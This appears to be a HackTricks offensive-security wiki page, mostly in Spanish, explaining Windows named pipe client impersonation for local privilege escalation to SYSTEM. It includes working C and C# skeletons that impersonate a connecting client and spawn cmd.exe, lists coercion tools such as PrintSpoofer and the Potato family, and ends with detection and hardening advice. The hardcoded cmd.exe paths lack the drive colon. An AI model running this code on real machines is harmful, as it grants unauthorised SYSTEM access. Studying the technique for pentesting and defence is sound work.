# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation es una primitiva de escalada de privilegios local que permite que un hilo servidor de named-pipe adopte el contexto de seguridad de un cliente que se conecta a él. En la práctica, un atacante que pueda ejecutar código con SeImpersonatePrivilege puede forzar a un cliente privilegiado (p. ej., un servicio SYSTEM) a conectarse a una pipe controlada por el atacante, llamar a ImpersonateNamedPipeClient, duplicar el token resultante a un token primario y crear un proceso como el cliente (a menudo NT AUTHORITY\SYSTEM).

This page focuses on the core technique. For end-to-end exploit chains that coerce SYSTEM to your pipe, see the Potato family pages referenced below.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Requisitos y APIs clave
- Privilegios típicamente necesarios por el proceso/hilo que llama:
- SeImpersonatePrivilege para impersonar con éxito a un cliente que se conecta y para usar CreateProcessWithTokenW.
- Alternativamente, después de impersonar SYSTEM, puedes usar CreateProcessAsUser, lo cual puede requerir SeAssignPrimaryTokenPrivilege y SeIncreaseQuotaPrivilege (estos están satisfechos cuando estás impersonando SYSTEM).
- APIs principales utilizadas:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (se debe leer al menos un mensaje antes de la impersonación)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: para realizar acciones útiles localmente, el cliente debe permitir SecurityImpersonation (por defecto en muchos clientes locales RPC/named-pipe). Los clientes pueden reducir esto con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION al abrir la pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notas:
- Si ImpersonateNamedPipeClient devuelve ERROR_CANNOT_IMPERSONATE (1368), asegúrate de leer del pipe primero y de que el cliente no restringió impersonation al nivel Identification.
- Prefiere DuplicateTokenEx con SecurityImpersonation y TokenPrimary para crear un token primario adecuado para la creación de procesos.

## .NET ejemplo rápido
En .NET, NamedPipeServerStream puede impersonate a través de RunAsClient. Una vez impersonating, duplica el thread token y crea un proceso.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Desencadenantes/coerciones comunes para conseguir que SYSTEM se conecte a tu named pipe
Estas técnicas fuerzan a servicios privilegiados a conectarse a tu named pipe para que puedas suplantarlos:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Ver uso detallado y compatibilidad aquí:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si solo necesitas un ejemplo completo de cómo crear el pipe y suplantar para iniciar SYSTEM desde un desencadenante de servicio, consulta:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Solución de problemas y advertencias
- Debes leer al menos un mensaje del pipe antes de llamar a ImpersonateNamedPipeClient; de lo contrario obtendrás ERROR_CANNOT_IMPERSONATE (1368).
- Si el cliente se conecta con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, el servidor no puede suplantar completamente; verifica el nivel de impersonation del token con GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requiere SeImpersonatePrivilege en el llamador. Si eso falla con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser después de haber suplantado a SYSTEM.
- Asegúrate de que el security descriptor de tu pipe permita al servicio objetivo conectarse si lo endureces; por defecto, los pipes bajo \\.\pipe son accesibles según la DACL del servidor.

## Detección y endurecimiento
- Monitorea la creación y las conexiones a named pipes. Sysmon Event IDs 17 (Pipe Created) y 18 (Pipe Connected) son útiles para establecer una línea base de nombres de pipe legítimos y detectar pipes inusuales, con aspecto aleatorio, que preceden a eventos de manipulación de tokens.
- Busca secuencias: un proceso crea un pipe, un servicio SYSTEM se conecta, y luego el proceso creador lanza un hijo como SYSTEM.
- Reduce la exposición eliminando SeImpersonatePrivilege de cuentas de servicio no esenciales y evitando inicios de sesión de servicio innecesarios con privilegios elevados.
- Desarrollo defensivo: al conectarse a named pipes no confiables, especifica SECURITY_SQOS_PRESENT con SECURITY_IDENTIFICATION para evitar que los servidores puedan suplantar completamente al cliente a menos que sea necesario.

## Referencias
- Windows: documentación de ImpersonateNamedPipeClient (requisitos y comportamiento de impersonation). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (guía y ejemplos de código). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
